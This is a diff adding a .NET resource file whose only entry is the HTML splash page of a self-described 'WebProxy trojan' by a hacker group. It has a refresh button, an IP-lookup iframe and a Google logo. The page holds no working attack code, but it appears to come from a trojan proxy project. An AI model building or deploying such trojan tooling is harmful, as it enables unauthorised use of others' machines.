@@ -1,0 +1,82 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="welcome"><value>&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+&lt;title&gt;Welcome to WebProxy trojan produced by fLaSh&lt;/title&gt;
+&lt;style type="text/css"&gt;
+&lt;!--
+body,td,th {
+	font-family: Courier New, Courier, monospace;
+	font-size: 10px;
+	color: #00CC00;
+}
+body {
+	background-color: #000000;
+}
+.style4 {font-weight: bold}
+.style5 {font-size: 18px; }
+.style7 {font-size: 18px; font-family: "Courier New", Courier, monospace; }
+--&gt;
+&lt;/style&gt;
+
+&lt;script language="JavaScript"&gt;
+&lt;!--
+
+//  The "refresh" function implementations are identical
+//  to our regular "JavaScript-Refresh" example.  The only
+//  difference from our JavaScript Refresh example is
+//  we do not have a doLoad function that starts our
+//  refresh timer (since we use a refresh button).
+
+var sURL = unescape(window.location.pathname);
+
+function refresh()
+{
+    window.location.href = sURL;
+}
+//--&gt;
+&lt;/script&gt;
+
+&lt;p align="center" class="style5"&gt;&lt;span class="style4"&gt;&lt;span class="style5"&gt;&lt;strong&gt;W3lc0m3 t0 w3bPr0xy tr0j4n&lt;/strong&gt;&lt;br&gt;
+  &lt;/span&gt;&lt;/span&gt;&lt;span class="style7"&gt;Produced bY fLaSh&lt;br&gt; 
+ZONE-HACKER TEAM&lt;/span&gt;&lt;/p&gt;
+&lt;p align="center" class="style5"&gt;
+  &lt;input
+  name="button1" type="button" onClick="refresh()" value="Continue your request"&gt;
+&lt;/p&gt;
+&lt;p align="center" class="style5"&gt;
+&lt;iframe src="http://www.ip2location.com/ib2/" width="204" height="162" marginwidth="1" scrolling="no" frameborder="0"&gt;&lt;/iframe&gt;
+&lt;/head&gt;
+&lt;/p&gt;
+&lt;p align="center" class="style5"&gt;&lt;strong&gt;&lt;a href="http://www.google.com/"&gt;&lt;img src="http://www.google.com/logos/Logo_60blk.gif" alt="Google" width="176" height="77"
+border="0" align="absmiddle"&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/html&gt;</value></data>
+  </root>
